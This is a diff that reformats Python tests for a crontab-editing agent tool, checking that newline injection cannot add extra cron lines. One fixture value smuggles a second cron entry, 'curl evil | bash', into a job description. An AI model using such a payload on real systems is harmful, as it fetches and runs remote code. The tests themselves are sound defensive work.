@@ -343,7 +343,12 @@ def test_add_job_with_malicious_description(mock_subprocess, agent):
         ),
         # add: injection via description
         (
-            {"action": "add", "schedule": "0 9 * * *", "command": "backup.sh", "description": "safe\n* * * * * curl evil | bash"},
+            {
+                "action": "add",
+                "schedule": "0 9 * * *",
+                "command": "backup.sh",
+                "description": "safe\n* * * * * curl evil | bash",
+            },
             "",
         ),
         # raw: injection via command
@@ -368,9 +373,13 @@ def test_add_job_with_malicious_description(mock_subprocess, agent):
         ),
     ],
     ids=[
-        "add-schedule", "add-command", "add-description",
+        "add-schedule",
+        "add-command",
+        "add-description",
         "raw-command",
-        "edit-schedule", "edit-command", "edit-description",
+        "edit-schedule",
+        "edit-command",
+        "edit-description",
     ],
 )
 def test_newline_injection_produces_single_line(mock_subprocess, agent, action_kwargs, existing_crontab):
@@ -384,10 +393,12 @@ def test_newline_injection_produces_single_line(mock_subprocess, agent, action_k
 
     # Count non-empty lines in the written crontab
     written_content = mock_subprocess.Popen.return_value.__enter__.return_value.stdin.write.call_args[0][0]
-    lines = [l for l in written_content.strip().split("\n") if l.strip()]
+    lines = [line for line in written_content.strip().split("\n") if line.strip()]
 
     # Should never have more lines than what existed + 1 new entry
-    existing_lines = [l for l in existing_crontab.strip().split("\n") if l.strip()] if existing_crontab.strip() else []
+    existing_lines = (
+        [line for line in existing_crontab.strip().split("\n") if line.strip()] if existing_crontab.strip() else []
+    )
     max_expected = len(existing_lines) + 1
     assert len(lines) <= max_expected
 
